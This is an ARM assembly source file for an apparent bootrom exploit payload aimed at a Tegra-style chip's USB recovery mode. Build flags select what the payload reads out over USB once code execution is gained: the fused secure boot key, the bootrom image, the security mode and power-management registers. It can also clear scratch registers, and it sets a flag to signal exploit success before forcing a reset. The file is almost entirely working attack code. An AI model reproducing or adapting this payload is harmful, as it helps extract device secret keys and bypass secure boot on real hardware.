//
// Payload launcher stub.
//

#define IROM_START 0xfff00000
#define IROM_SIZE (48 * 1024)

#define IRAM_START 0x40000000
#define IRAM_END (IRAM_START + 256 * 1024)
#define MINILOADER_ENTRY 0x4000F000
#define FILL_START (MINILOADER_ENTRY + 1024)

#define FLAG_ADDR (IRAM_END - 128)

#define IROM_COPY_ADDR 0x4002f000


#define PMC_BASE 0x7000E400
#define _REG(base, off) ((base) + (off))
#define PMC(off) _REG(PMC_BASE, off)

#define PMC_SCRATCH0 0x50
#define PMC_SECURE_SCRATCH5 0xc4

#define PMC_SCRATCH24 0xfc
#define PMC_SCRATCH42 0x144

#define PMC_RST_STATUS 0x1b4

#define PMC_SECURE_SCRATCH6 0x224
#define PMC_SCRATCH2_ECO 0x304

#define APB_MISC_PP_STRAPPING_OPT_A_0 0x70000008

#define FUSE_PRIVATE_KEY0 0x7000F9A4
#define FUSE_PRIVATE_KEY4 0x7000F9B4
#define SBK_DUMP_SIZE (FUSE_PRIVATE_KEY4 - FUSE_PRIVATE_KEY0 + 4)

#define FUSE_CP_REV 0x7000F990

#define write_ep1_in_sync (0xfff06ccc + 1)
#define usb_reset_ep1 (0xfff0679e + 1)

#define get_security_mode (0xfff0228c + 1)

#define USB_BUFFERS_ADDR 0x400021e8

//#define DUMP_BOOT_REASON

//#define DUMP_USB_BUFFERS

//#define DUMP_FUSE_CP_REV

//#define CLEAR_RESET_STATUS

#define SAY_HELLO

#define REBOOT_RCM

//#define DUMP_IROM

#define DUMP_SECURE_MODE

//#define DUMP_SBK

//#define FILL_IRAM

//#define COPY_IROM_TO_IRAM

//#define ZERO_SCRATCH

    .globl _start

    .section ".text"
_start:

#ifdef DUMP_BOOT_REASON
    sub sp, sp, #8
    mov r0, sp
    ldr r1, =0xDEADBEEF
    bl x32_to_str
    mov r0, sp
    mov r1, #8
    sub sp, sp, #4
    mov r2, sp
    ldr ip, =write_ep1_in_sync
    mov lr, pc
    bx ip
    add sp, sp, #12

    sub sp, sp, #8
    mov r0, sp
    ldr r1, =PMC(PMC_RST_STATUS)
    ldr r1, [r1]
    bl x32_to_str
    mov r0, sp
    mov r1, #8
    sub sp, sp, #4
    mov r2, sp
    ldr ip, =write_ep1_in_sync
    mov lr, pc
    bx ip
    add sp, sp, #12

    sub sp, sp, #8
    mov r0, sp
    ldr r1, =PMC(PMC_SCRATCH0)
    ldr r1, [r1]
    bl x32_to_str
    mov r0, sp
    mov r1, #8
    sub sp, sp, #4
    mov r2, sp
    ldr ip, =write_ep1_in_sync
    mov lr, pc
    bx ip
    add sp, sp, #12

    sub sp, sp, #8
    mov r0, sp
    ldr r1, =APB_MISC_PP_STRAPPING_OPT_A_0
    ldr r1, [r1]
    bl x32_to_str
    mov r0, sp
    mov r1, #8
    sub sp, sp, #4
    mov r2, sp
    ldr ip, =write_ep1_in_sync
    mov lr, pc
    bx ip
    add sp, sp, #12

    sub sp, sp, #8
    mov r0, sp
    ldr r1, =FLAG_ADDR
    ldr r1, [r1]
    bl x32_to_str
    mov r0, sp
    mov r1, #8
    sub sp, sp, #4
    mov r2, sp
    ldr ip, =write_ep1_in_sync
    mov lr, pc
    bx ip
    add sp, sp, #12

    sub sp, sp, #8
    mov r0, sp
    ldr r1, =0x13371337
    bl x32_to_str
    mov r0, sp
    mov r1, #8
    sub sp, sp, #4
    mov r2, sp
    ldr ip, =write_ep1_in_sync
    mov lr, pc
    bx ip
    add sp, sp, #12
#endif

#ifdef DUMP_USB_BUFFERS
    sub sp, sp, #8
    mov r0, sp
    ldr r1, =0x55555555
    bl x32_to_str
    mov r0, sp
    mov r1, #8
    sub sp, sp, #4
    mov r2, sp
    ldr ip, =write_ep1_in_sync
    mov lr, pc
    bx ip
    add sp, sp, #12

    sub sp, sp, #8
    mov r0, sp
    ldr r1, =USB_BUFFERS_ADDR
    ldr r1, [r1]
    bl x32_to_str
    mov r0, sp
    mov r1, #8
    sub sp, sp, #4
    mov r2, sp
    ldr ip, =write_ep1_in_sync
    mov lr, pc
    bx ip
    add sp, sp, #12

    sub sp, sp, #8
    mov r0, sp
    ldr r1, =(USB_BUFFERS_ADDR + 4)
    ldr r1, [r1]
    bl x32_to_str
    mov r0, sp
    mov r1, #8
    sub sp, sp, #4
    mov r2, sp
    ldr ip, =write_ep1_in_sync
    mov lr, pc
    bx ip
    add sp, sp, #12

    sub sp, sp, #8
    mov r0, sp
    ldr r1, =0xAAAAAAAA
    bl x32_to_str
    mov r0, sp
    mov r1, #8
    sub sp, sp, #4
    mov r2, sp
    ldr ip, =write_ep1_in_sync
    mov lr, pc
    bx ip
    add sp, sp, #12
#endif

#ifdef DUMP_FUSE_CP_REV
    sub sp, sp, #8
    mov r0, sp
    ldr r1, =0x11111111
    bl x32_to_str
    mov r0, sp
    mov r1, #8
    sub sp, sp, #4
    mov r2, sp
    ldr ip, =write_ep1_in_sync
    mov lr, pc
    bx ip
    add sp, sp, #12

    sub sp, sp, #8
    mov r0, sp
    ldr r1, =FUSE_CP_REV
    ldr r1, [r1]
    bl x32_to_str
    mov r0, sp
    mov r1, #8
    sub sp, sp, #4
    mov r2, sp
    ldr ip, =write_ep1_in_sync
    mov lr, pc
    bx ip
    add sp, sp, #12

    sub sp, sp, #8
    mov r0, sp
    ldr r1, =0x22222222
    bl x32_to_str
    mov r0, sp
    mov r1, #8
    sub sp, sp, #4
    mov r2, sp
    ldr ip, =write_ep1_in_sync
    mov lr, pc
    bx ip
    add sp, sp, #12
#endif

#ifdef ZERO_SCRATCH
    mov r2, #0
    ldr r0, =PMC(PMC_SCRATCH0)
    mov r1, #(PMC(PMC_SECURE_SCRATCH5) - PMC(PMC_SCRATCH0) + 4)
    bl zero_block
    ldr r0, =PMC(PMC_SCRATCH24)
    mov r1, #(PMC(PMC_SCRATCH42) - PMC(PMC_SCRATCH24) + 4)
    bl zero_block
    ldr r0, =PMC(PMC_SECURE_SCRATCH6)
    mov r1, #(PMC(PMC_SCRATCH2_ECO) - PMC(PMC_SECURE_SCRATCH6) + 4)
    bl zero_block
    //ldr r0, =IROM_START
    //ldr r1, =IROM_SIZE*2
    //bl zero_block
#endif

#ifdef CLEAR_RESET_STATUS
    ldr r0, =PMC(PMC_RST_STATUS)
    mov r1, #0
    str r1, [r0]
#endif

#ifdef FILL_IRAM
    bl fill_iram
#endif

#ifdef COPY_IROM_TO_IRAM
    ldr r0, =IROM_COPY_ADDR
    ldr r1, =#IROM_START
    mov r2, #IROM_SIZE
    bl copy
#endif

#ifdef SAY_HELLO
    ldr r0, =hello_str
    mov r1, #hello_str_len
    sub r2, sp, #4
    sub sp, sp, #4
    ldr ip, =write_ep1_in_sync
    mov lr, pc
    bx ip
    add sp, sp, #4
    mov r0, #0
    mov r1, #1
    ldr ip, =usb_reset_ep1
    mov lr, pc
    bx ip
#endif

#ifdef DUMP_SBK
    sub sp, sp, #SBK_DUMP_SIZE
    mov r0, sp
    ldr r1, =#FUSE_PRIVATE_KEY0
    mov r2, #SBK_DUMP_SIZE
    bl copy
    mov r0, sp
    mov r1, #SBK_DUMP_SIZE
    sub r2, sp, #4
    sub sp, sp, #4
    ldr ip, =write_ep1_in_sync
    mov lr, pc
    bx ip
    add sp, sp, #4
    mov r0, #0
    mov r1, #1
    ldr ip, =usb_reset_ep1
    mov lr, pc
    bx ip
#endif

#ifdef DUMP_IROM
    ldr r0, =#0xFFF0F000
    ldr r1, =#0x1000
    sub r2, sp, #4
    sub sp, sp, #4
    ldr ip, =write_ep1_in_sync
    mov lr, pc
    bx ip
    add sp, sp, #4
    mov r0, #0
    mov r1, #1
    ldr ip, =usb_reset_ep1
    mov lr, pc
    bx ip
#endif

#ifdef DUMP_SECURE_MODE
    sub sp, sp, #4
    mov r0, sp
    // call bootrom function
    ldr ip, =get_security_mode
    mov lr, pc
    bx ip
    
    mov r0, sp
    mov r1, #4
    sub sp, sp, #4
    mov r2, sp
    ldr ip, =write_ep1_in_sync
    mov lr, pc
    bx ip
    add sp, sp, #8
#endif


    bl func_past_stack_overwrite

    ldr r0, =FLAG_ADDR
    ldr r1, =#0xBAADF00D
    str r1, [r0]

    ldr r0, =PMC(PMC_SCRATCH0)
    ldr r1, [r0]
#ifndef REBOOT_RCM
    // set bit to indicate exploit success
    mov r1, #0x10000000
#else
    // set RCM bit
    mov r1, #(1 << 1)
#endif
    str r1, [r0]

    // reset
    ldr r0, =PMC(0)
    ldr r1, [r0]
    orr r1, #(1 << 4)
    str r1, [r0]

L_spin:
    b L_spin


#ifdef FILL_IRAM
    .globl fill_iram
fill_iram:
    ldr r0, =FILL_START
    ldr r1, =IRAM_END
L_fill_word:
    ldr r2, =#0x13371337
    str r2, [r0], #4
    cmp r0, r1
    bne L_fill_word
    bx lr
#endif

#if defined(COPY_IROM_TO_IRAM) || defined(DUMP_SBK)
//
// Simple block copy.
//   r0 = destination address
//   r1 = source address
//   r2 = length in bytes
// Destroys r0-r3.
//
    .globl copy
copy:

    // Copy the word...
    ldr r3, [r1], #4
    str r3, [r0], #4

    // And continue while we have words left to copy.
    subs r2, r2, #4
    bne copy

    // Once we're done, return.
    bx lr
#endif

#ifdef ZERO_SCRATCH
//
// Sets memory
//   r0 = destination address
//   r1 = length in bytes
//   r2 = fill value
// Destroys r0-r1.
//
    .globl zero_block
zero_block:

    // Store the word...
    str r2, [r0], #4

    // And continue while we have words left to copy.
    subs r1, r1, #4
    bne zero_block

    // Once we're done, return.
    bx lr
#endif

    .global x32_to_str
    .type   x32_to_str, %function
x32_to_str:
    add r2, r0, #8
.Lnibble_loop:
    mov r3, r1, lsr #28
    cmp r3, #9
    addls   r3, r3, #48
    addhi   r3, r3, #55
    strb    r3, [r0]
    add r0, r0, #1
    cmp r0, r2
    mov r1, r1, asl #4
    bne .Lnibble_loop
    bx  lr

#ifdef SAY_HELLO
    .globl  hello_str
    .type   hello_str, %object
    .size   hello_str, Lhello_str_end - hello_str
    .align 4
hello_str:
    .asciz "hello, world\n"
Lhello_str_end:
    .equ    hello_str_len, . - hello_str

    .globl  newline_str
    .type   newline_str, %object
    .size   newline_str, Lhello_str_end - newline_str
    .align 4
newline_str:
    .asciz "\n"
Lnewline_str_end:
    .equ    newline_str_len, . - newline_str
#endif

    .ltorg

    .space 0x200
    #.space 70000
    # .space 0x8000
    # .space 0x000049bc
    # .space 0x000049c0
    # .space 0x000049c4

    .globl func_past_stack_overwrite
func_past_stack_overwrite:
    push {lr}
    sub sp, sp, #8
    mov r0, sp
    ldr r1, =0xFACEF00D
    bl x32_to_str
    mov r0, sp
    mov r1, #8
    sub sp, sp, #4
    mov r2, sp
    ldr ip, =write_ep1_in_sync
    mov lr, pc
    bx ip
    add sp, sp, #12
    pop {lr}
    bx lr
